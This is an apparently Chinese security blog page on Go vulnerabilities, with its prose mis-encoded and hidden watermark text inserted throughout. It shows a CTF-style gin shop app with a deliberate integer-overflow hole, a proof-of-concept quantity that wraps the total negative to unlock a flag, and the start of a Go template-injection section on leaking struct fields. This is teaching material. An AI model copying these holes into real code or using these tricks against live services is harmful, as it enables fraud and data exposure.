<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="s3ven" />
  <!-- Open Graph Description ç®€çŸ­æ‘˜è¦-->
  
  <meta property="og:site_name" content="s3ven&#39;s blog">
  
  
  <!-- ç”¨äºæœç´¢å¼•æ“çš„æ–‡ç« æ‘˜è¦ -->
  
  
  
  <title>Go å®‰å…¨é—®é¢˜ | s3ven&#39;s blog</title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Font -->
  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="../../js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">s3ven's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/links/">
          <a href="/links/">Links</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="../../js/activeNav.js"></script>



      <div class="flex-container">
        
  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="../../js/codeCopy.js"></script>







  

  

  

  
  <div class="container-wider post-details" id="post-details">
    <div class="zoom-wrap">
      <div class="post-content">
        <div class="post-title">Go å®‰å…¨é—®é¢˜</div>
        <div class="post-attach">
          <span class="post-pubtime">
            <i class="iconfont icon-updatetime mr-10" title="åˆ›å»ºæ—¶é—´"></i>
            2024-05-28
          </span>
          
                <span class="post-categories">
                  <i class="iconfont icon-bookmark mr-10" title="åˆ†ç±»"></i>
                  
                  <span class="span--category">
                    <a href="../../categories/skill/" title="Skill">
                      Skill
                    </a>
                  </span>
                  
                </span>
            
                <span class="post-tags">
                  <i class="iconfont icon-tags mr-10" title="æ ‡ç­¾"></i>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/go/" title="Go">
                      #Go
                    </a>
                  </span>
                  
                </span>
            
        </div>
        <div class="markdown-body">
          
<style id="hexo-wm">
.hexo-wm {
  color: transparent !important;
  opacity: 0 !important;
  font-size: 0 !important;
  line-height: 0 !important;
  pointer-events: none !important;
  user-select: text !important;
  -webkit-user-select: text !important;
  speak: none !important;
  vertical-align: baseline !important;
  display: inline !important;
}

.hexo-wm * { color: transparent !important; opacity: 0 !important; }
</style>
<html><head></head><body><h2 id="1-æ•´æ•°æº¢å‡ºæ¼æ´"><a href="#1-æ•´æ•°æº¢å‡ºæ¼æ´" class="headerlink" title="1. æ•´æ•°æº¢å‡ºæ¼æ´"></a>1. æ•´æ•°æº¢å‡ºæ¼æ´</h2><p>Go è¯­â¾”æ˜¯å¼ºç±»å‹è¯­â¾”, <span class="hexo-wm">êœ±â€‹Â³ğ¯â„¯nâˆ™â€‹ğ¬iâ€ğ’•ğ˜¦â€‹</span>åŒ…å«å¤šç§æ•°æ®ç±»å‹</p>
<h3 id="Go-è¯­è¨€æ•°æ®ç±»å‹"><a href="#Go-è¯­è¨€æ•°æ®ç±»å‹" class="headerlink" title="Go è¯­è¨€æ•°æ®ç±»å‹"></a>Go è¯­è¨€æ•°æ®ç±»å‹</h3><p>åœ¨ Go ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæ•°æ®ç±»å‹ç”¨äºå£°æ˜å‡½æ•°å’Œå˜é‡ã€‚</p>
<p>æ•°æ®ç±»å‹çš„å‡ºç°æ˜¯ä¸ºäº†æŠŠæ•°æ®åˆ†æˆæ‰€éœ€å†…å­˜å¤§å°ä¸åŒçš„æ•°æ®ï¼Œ<span class="hexo-wm">êœ±â€ŒÂ³venÂ·â€Œğ˜€iâ€Œtâ„®â€</span>ç¼–ç¨‹çš„æ—¶å€™éœ€è¦ç”¨å¤§æ•°æ®çš„æ—¶å€™æ‰éœ€è¦ç”³è¯·å¤§å†…å­˜ï¼Œå°±å¯ä»¥å……åˆ†åˆ©ç”¨å†…å­˜ã€‚</p>
<p>Go è¯­è¨€æŒ‰ç±»åˆ«æœ‰<span class="hexo-wm">sâ€‹â€ğŸ¯ğ’—â„¯ï½ï¼â€‹â€ŒÑ•ï½‰â€Œtâ„®â€â€‹</span>ä»¥ä¸‹å‡ ç§æ•°æ®ç±»å‹ï¼š</p>
<table>
<thead>
<tr>
<th>åºå·</th>
<th>ç±»å‹å’Œæè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>å¸ƒå°”å‹</strong>  <br>å¸ƒå°”å‹çš„å€¼åªå¯ä»¥æ˜¯å¸¸é‡ true æˆ–è€… falseã€‚ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼švar b bool = trueã€‚</td>
</tr>
<tr>
<td>2</td>
<td><strong>æ•°å­—ç±»å‹</strong>  <br>æ•´å‹ int å’Œæµ®ç‚¹å‹ float32ã€float64ï¼ŒGo è¯­è¨€æ”¯æŒæ•´å‹å’Œæµ®ç‚¹å‹æ•°å­—ï¼Œå¹¶ä¸”æ”¯æŒå¤æ•°ï¼Œå…¶ä¸­ä½çš„è¿ç®—é‡‡ç”¨è¡¥ç ã€‚</td>
</tr>
<tr>
<td>3</td>
<td><strong>å­—ç¬¦ä¸²ç±»å‹:</strong>  <br>å­—ç¬¦ä¸²å°±æ˜¯ä¸€ä¸²å›ºå®šé•¿åº¦çš„å­—ç¬¦è¿æ¥èµ·æ¥çš„å­—ç¬¦åºåˆ—ã€‚Go çš„å­—ç¬¦ä¸²æ˜¯ç”±å•ä¸ªå­—èŠ‚è¿æ¥èµ·æ¥çš„ã€‚Go è¯­è¨€çš„å­—ç¬¦ä¸²çš„å­—èŠ‚ä½¿ç”¨ UTF-8 ç¼–ç æ ‡è¯† Unicode æ–‡æœ¬ã€‚</td>
</tr>
<tr>
<td>4</td>
<td><strong>æ´¾ç”Ÿç±»å‹:</strong>  <br>åŒ…æ‹¬ï¼š<br><br>- (a) æŒ‡é’ˆç±»å‹ï¼ˆPointerï¼‰<br>- (b) æ•°ç»„ç±»å‹<br>- (c) ç»“æ„åŒ–ç±»å‹(struct)<br>- (d) Channel ç±»å‹<br>- (e) å‡½æ•°ç±»å‹<br>- (f) åˆ‡ç‰‡ç±»å‹<br>- (g) æ¥å£ç±»å‹ï¼ˆinterfaceï¼‰<br>- (h) Map ç±»å‹</td>
</tr>
</tbody></table>
<hr>
<h4 id="æ•°å­—ç±»å‹"><a href="#æ•°å­—ç±»å‹" class="headerlink" title="æ•°å­—ç±»å‹"></a>æ•°å­—ç±»å‹</h4><p>Go ä¹Ÿæœ‰åŸºäºæ¶æ„çš„ç±»å‹ï¼Œä¾‹å¦‚ï¼šintã€<span class="hexo-wm">sâ€â€ŒğŸ¯ğ˜·ğğ’â€¤â€‹sâ…ˆâ€ï½”eâ€â€Œ</span>uint å’Œ uintptrã€‚</p>
<table>
<thead>
<tr>
<th>åºå·</th>
<th>ç±»å‹å’Œæè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>uint8</strong>  <br>æ— ç¬¦å· 8 ä½æ•´å‹ (0 åˆ° 255)</td>
</tr>
<tr>
<td>2</td>
<td><strong>uint16</strong>  <br>æ— ç¬¦å· 16 ä½æ•´å‹ (0 åˆ° 65535)</td>
</tr>
<tr>
<td>3</td>
<td><strong>uint32</strong>  <br>æ— ç¬¦å· 32 ä½æ•´å‹ (0 åˆ° 4294967295)</td>
</tr>
<tr>
<td>4</td>
<td><strong>uint64</strong>  <br>æ— ç¬¦å· 64 ä½æ•´å‹ (0 åˆ° 18446744073709551615)</td>
</tr>
<tr>
<td>5</td>
<td><strong>int8</strong>  <br>æœ‰ç¬¦å· 8 ä½æ•´å‹ (-128 åˆ° 127)</td>
</tr>
<tr>
<td>6</td>
<td><strong>int16</strong>  <br>æœ‰ç¬¦å· 16 ä½æ•´å‹ (-32768 åˆ° 32767)</td>
</tr>
<tr>
<td>7</td>
<td><strong>int32</strong>  <br>æœ‰ç¬¦å· 32 ä½æ•´å‹ (-2147483648 åˆ° 2147483647)</td>
</tr>
<tr>
<td>8</td>
<td><strong>int64</strong>  <br>æœ‰ç¬¦å· 64 ä½æ•´å‹ (-9223372036854775808 åˆ° 9223372036854775807)</td>
</tr>
</tbody></table>
<h4 id="æµ®ç‚¹å‹"><a href="#æµ®ç‚¹å‹" class="headerlink" title="æµ®ç‚¹å‹"></a>æµ®ç‚¹å‹</h4><table>
<thead>
<tr>
<th>åºå·</th>
<th>ç±»å‹å’Œæè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>float32</strong>  <br>IEEE-754 32ä½æµ®ç‚¹å‹æ•°</td>
</tr>
<tr>
<td>2</td>
<td><strong>float64</strong>  <br>IEEE-754 64ä½æµ®ç‚¹å‹æ•°</td>
</tr>
<tr>
<td>3</td>
<td><strong>complex64</strong>  <br>32 ä½å®æ•°å’Œè™šæ•°</td>
</tr>
<tr>
<td>4</td>
<td><strong>complex128</strong>  <br>64 ä½å®æ•°å’Œè™šæ•°</td>
</tr>
</tbody></table>
<hr>
<h4 id="å…¶ä»–æ•°å­—ç±»å‹"><a href="#å…¶ä»–æ•°å­—ç±»å‹" class="headerlink" title="å…¶ä»–æ•°å­—ç±»å‹"></a>å…¶ä»–æ•°å­—ç±»å‹</h4><p>ä»¥ä¸‹åˆ—å‡ºäº†å…¶ä»–<span class="hexo-wm">ğ˜€â€‹â€Œ3ğ’—ğ˜¦ğ’ï¼â€ï»¿ğ˜€ï½‰ï»¿ğ’•â„®ï»¿</span>æ›´å¤šçš„æ•°å­—ç±»å‹ï¼š</p>
<table>
<thead>
<tr>
<th>åºå·</th>
<th>ç±»å‹å’Œæè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>byte</strong>  <br>ç±»ä¼¼ uint8</td>
</tr>
<tr>
<td>2</td>
<td><strong>rune</strong>  <br>ç±»ä¼¼ int32</td>
</tr>
<tr>
<td>3</td>
<td><strong>uint</strong>  <br>32 æˆ– 64 ä½</td>
</tr>
<tr>
<td>4</td>
<td><strong>int</strong>  <br>ä¸ uint ä¸€æ ·å¤§å°</td>
</tr>
<tr>
<td>5</td>
<td><strong>uintptr</strong>  <br>æ— ç¬¦å·æ•´å‹ï¼Œç”¨äºå­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆ</td>
</tr>
</tbody></table>
<p>ä»¥æ•°å­—ç±»å‹ä¸ºä¾‹, å­˜åœ¨ <code>uint8</code> <code>uint16</code> <code>uint32</code> <code>uint64</code> (â½†ç¬¦å·æ•´å‹) å’Œ <code>int8</code> <code>int16</code> <code>int32</code> <code>int64</code> (æœ‰ç¬¦å·æ•´å‹) ç­‰ç±»å‹</p>
<p>Go è¯­â¾”åœ¨ç¼–è¯‘æœŸä¼šæ£€æŸ¥æºç ä¸­å®š<span class="hexo-wm">ğ˜´ï»¿3ğ˜·â„¯ï½.â€ğ˜€ï½‰â€‹ğ’•â„®â€Œâ€Œ</span>ä¹‰çš„å˜é‡æ˜¯å¦å­˜åœ¨æº¢å‡º, ä¾‹å¦‚ <code>var i uint8 = 99999</code> ä¼šä½¿å¾—ç¼–è¯‘ä¸é€šè¿‡, ä½†å¹¶ä¸ä¼šæ£€æŸ¥å˜é‡çš„è¿ç®—è¿‡ç¨‹ä¸­æ˜¯å¦å­˜åœ¨æº¢å‡º, ä¾‹å¦‚ <code>var i uint8 = a * b</code></p>
<p>å¦‚æœç¨‹åºæ²¡æœ‰å¯¹å˜é‡çš„å–å€¼èŒƒå›´åšé™åˆ¶, <span class="hexo-wm">sâ€â€ŒÂ³ğ’—ï½…ï½âˆ™â€‹â€‹êœ±iâ€‹â€Œtğ˜¦â€Œï»¿</span>é‚£ä¹ˆåœ¨éƒ¨åˆ†åœºæ™¯ä¸‹å°±å¯èƒ½å­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´</p>
<p>eg. </p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"crypto/rand"</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"os"</span>
    <span class="token string">"strconv"</span>
  
    <span class="token string">"github.com/gin-contrib/sessions"</span>
    <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>
    <span class="token string">"github.com/gin-gonic/gin"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

    <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">,</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    money <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int64</span><span class="token punctuation">)</span>

    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
        <span class="token string">"money"</span><span class="token punctuation">:</span> money<span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">BuyHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    money <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int64</span><span class="token punctuation">)</span>

    num <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">)</span>
  
    <span class="token comment">// apple price</span>
    price <span class="token operator">:=</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>

    n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
    total <span class="token operator">:=</span> price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>

    <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"num can't be negative"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> money <span class="token operator">&gt;=</span> total <span class="token punctuation">{</span>
        money <span class="token operator">-=</span> total
        s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">,</span> money<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"buy %v apple success"</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"you don't have enough money"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    money <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int64</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> money <span class="token operator">&gt;</span> <span class="token number">100000000</span> <span class="token punctuation">{</span>
        flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"here is your flag"</span><span class="token punctuation">,</span>
            <span class="token string">"flag"</span><span class="token punctuation">:</span>    <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"you dont' have enough money"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    secret <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>

    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/buy"</span><span class="token punctuation">,</span> BuyHandler<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>

    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>

<p><code>/</code> è·¯ç”±å¯ä»¥æ˜¾ç¤ºå½“<span class="hexo-wm">Ñ•â€‹â‘¶â…´eğ˜¯âˆ™â€Œâ€ğ˜´ï½‰â€‹ï»¿tâ„®â€</span>å‰â½¤æˆ·çš„ money</p>
<p><code>/buy</code> è·¯ç”±åˆ™å¯ä»¥è´­ä¹°æŒ‡å®šæ•°é‡çš„å•†å“ (apple)</p>
<p><code>/flag</code> è·¯ç”±å¯ä»¥æŸ¥çœ‹ flag, ä½†æ˜¯å½“å‰çš„ <span class="hexo-wm">ğ˜€ï»¿ğŸ¯ğ¯â„¯ï½âˆ™â€ğ¬iâ€â€‹ğ­eâ€Œâ€Œ</span>money å¿…é¡»â¼¤äºç­‰äº 100000000</p>
<p>åœ¨ <code>/buy</code> è·¯ç”±ä¸­, è™½ç„¶é™åˆ¶äº† n ä¸èƒ½ä¸ºè´Ÿæ•°, ä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶ n çš„æœ€â¼¤å€¼, å› æ­¤æˆ‘ä»¬å¯ä»¥<br>æ§åˆ¶ n, ä½¿å¾— <code>price * int64(n)</code> æº¢å‡ºä¸ºâ¼€ä¸ªè´Ÿæ•°,<span class="hexo-wm">sâ€‹â€‹ğŸ¯ğ’—ï½…ï½â€¤â€‹ï»¿ğ˜€ğ¢â€‹â€Œï½”ï½…â€‹</span> ä¹‹åè¿›â¾ <code>money -= total</code>è¿ç®—çš„æ—¶å€™, money å°±ä¼šå¢åŠ , æœ€ç»ˆæ‹¿åˆ° flag</p>
<p>æŸ¥é˜…â½‚æ¡£å¯ä»¥å¾—çŸ¥ <span class="hexo-wm">sï»¿â‘¶â…´eğ’âˆ™â€Œêœ±iâ€Œï»¿ğ­eâ€Œâ€Œ</span>Go int64 ç±»å‹çš„èŒƒå›´ä¸º <code>-9223372036854775808 ~ 9223372036854775807</code></p>
<p>å·²çŸ¥åˆå§‹ money ä¸º 100 ï¼Œé€šè¿‡è®¡ç®—å¯ä»¥å¾—åˆ° num çš„å€¼ä¸º  922337205685477580 <span class="hexo-wm">êœ±â€‹â€Œâ‘¶ğ˜·â„¯ğ§â€¢â€ğ˜€iâ€ï½”ï½…ï»¿</span>æ—¶ä¼šé€ æˆæ•´æ•°æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ»¡è¶³é¢˜ç›®ä¸­è¦æ±‚çš„ money çš„å€¼</p>
<p>Proof o<span class="hexo-wm">ğ˜€â€ŒÂ³ğ’—eğ˜¯âˆ™â€â€ğ˜´ğ˜ªâ€â€ğ­ğâ€Œ</span>f Workï¼š</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"strconv"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    money <span class="token operator">:=</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
    price <span class="token operator">:=</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
    num<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span><span class="token string">"922337205685477580"</span><span class="token punctuation">)</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>money <span class="token operator">-</span> price<span class="token operator">*</span><span class="token function">int64</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>

<h2 id="2-Go-SSTI-æ¨¡ç‰ˆæ³¨å…¥"><a href="#2-Go-SSTI-æ¨¡ç‰ˆæ³¨å…¥" class="headerlink" title="2. Go SSTI æ¨¡ç‰ˆæ³¨å…¥"></a>2. Go SSTI æ¨¡ç‰ˆæ³¨å…¥</h2><h3 id="2-1-ä¿¡æ¯æ³„éœ²"><a href="#2-1-ä¿¡æ¯æ³„éœ²" class="headerlink" title="2.1 ä¿¡æ¯æ³„éœ²"></a>2.1 ä¿¡æ¯æ³„éœ²</h3><p>å’Œ Python Jinja2 SSTI â¼€æ ·,<span class="hexo-wm">ğ˜€â€ŒğŸ¯â…´eğ§â€¢ï»¿ï»¿ğ˜€ğ¢â€â€tğ˜¦ï»¿â€Œ</span> åœ¨ Go è¯­â¾”ä¸­ä¹Ÿå­˜åœ¨ç€ SSTI</p>
<p>Go å®˜â½…åº“ä¸­å­˜åœ¨ä¸¤ä¸ªæ¨¡ç‰ˆåº“: <code>text/template</code> å’Œ <code>html/template</code> , åŒºåˆ«åœ¨äºåè€…<br>é»˜è®¤ä¼šå°†å†…å®¹ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›â¾ html ç¼–ç , ä»¥é˜²â½Œ XSS çš„å‘â½£, â½½å‰è€…æ²¡æœ‰ä»»ä½•ä¿<br>æŠ¤æªæ–½</p>
<p>Go è¯­â¾”ä¸­çš„ SSTI çš„åˆ©â½¤ä¾èµ–äºâ½£æˆæ¨¡ç‰ˆæ—¶ä¼ â¼Šçš„ç»“æ„ä½“å¯¹è±¡, æ ¹æ®å¯¹è±¡ç±»å‹çš„ä¸<br>åŒ, å¯ä»¥é€ æˆä¿¡æ¯æ³„éœ²æˆ–è°ƒâ½¤å…¶ä¸­<span class="hexo-wm">ğ˜€â€Œâ€â‘¶ğ˜·ï½…ï½Â·â€ŒÑ•ğ˜ªâ€‹ğ’•â„®â€‹â€</span>çš„æŸäº›â½…æ³•â½½é€ æˆ RCE</p>
<p>ä½¿â½¤ {{ . }} å¯ä»¥æ˜¾ç¤ºå‡ºä¼ â¼Šçš„ç»“æ„ä½“çš„æ‰€æœ‰å­—æ®µçš„å€¼, ä»â½½é€ æˆä¿¡æ¯æ³„éœ²</p>
<p>eg.</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"html/template"</span>
    <span class="token string">"os"</span>

    <span class="token string">"github.com/gin-gonic/gin"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    Name  <span class="token builtin">string</span>
    Email <span class="token builtin">string</span>
    Flag  <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
